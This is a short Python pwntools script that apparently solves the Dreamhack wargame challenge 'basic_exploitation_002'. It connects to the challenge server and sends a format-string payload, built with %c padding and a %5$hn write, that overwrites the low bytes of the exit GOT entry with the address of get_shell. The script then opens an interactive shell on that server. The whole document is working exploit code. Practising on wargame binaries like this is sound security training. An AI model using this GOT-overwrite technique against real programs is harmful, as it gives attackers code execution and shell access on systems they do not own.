from pwn import *
#p = process('./basic_exploitation_002')
p = remote('host3.dreamhack.games', 16537)
e = ELF('./basic_exploitation_002')
libc = e.libc
get_shell = p32(e.symbols['get_shell'])
exit_got = e.got['exit']
under = get_shell[:2]
under = int.from_bytes(under, "little")
payload = f"%{under}c".encode()
payload += b"%5$hn"
to_add = 16 - len(payload)
payload += b"a" * to_add
payload += p32(exit_got)
p.send(payload)
p.interactive()

